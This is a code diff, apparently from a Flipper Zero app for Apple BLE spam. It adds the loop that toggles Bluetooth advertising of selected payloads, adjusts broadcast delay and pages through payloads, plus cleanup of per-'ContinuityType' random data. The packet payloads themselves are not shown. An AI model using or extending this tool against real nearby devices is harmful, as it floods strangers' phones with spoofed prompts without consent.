+    gui_add_view_port(gui, view_port, GuiLayerFullscreen);
+
+    bool running = true;
+    
+    while(running) {
+        InputEvent input;
+        furi_check(furi_message_queue_get(input_queue, &input, FuriWaitForever) == FuriStatusOk);
+
+        Payload* payload = (state->index >= 0 && state->index <= PAYLOAD_COUNT - 1) ?
+                               &payloads[state->index] :
+                               NULL;
+        bool advertising = state->advertising;
+        switch(input.key) {
+        case InputKeyOk:
+            if(payload) toggle_adv(state, payload);
+            break;
+        case InputKeyUp:
+            if(payload && state->delay < COUNT_OF(delays) - 1) {
+                if(advertising) stop_adv(state);
+                state->delay++;
+                if(advertising) start_adv(state);
+            }
+            break;
+        case InputKeyDown:
+            if(payload && state->delay > 0) {
+                if(advertising) stop_adv(state);
+                state->delay--;
+                if(advertising) start_adv(state);
+            }
+            break;
+        case InputKeyLeft:
+            if(state->index > PAGE_MIN) {
+                if(advertising) toggle_adv(state, payload);
+                state->index--;
+            }
+            break;
+        case InputKeyRight:
+            if(state->index < PAGE_MAX) {
+                if(advertising) toggle_adv(state, payload);
+                state->index++;
+            }
+            break;
+        case InputKeyBack:
+            if(advertising) toggle_adv(state, payload);
+            running = false;
+            break;
+        default:
+            continue;
+        }
+
+        view_port_update(view_port);
+    }
+
+    gui_remove_view_port(gui, view_port);
+    furi_record_close(RECORD_GUI);
     view_port_free(view_port);
-    apple_ble_spam_app_free(app);
-    
+    furi_message_queue_free(input_queue);
+
+    // Cleanup
+    furi_timer_free(state->timer);
+    furi_string_free(state->status_text);
+    free(state);
+
+    for(ContinuityType type = 0; type < ContinuityTypeCount; type++) {
+        if(randoms[type].datas) {
+            free(randoms[type].datas);
+        }
+    }
     return 0;
 }
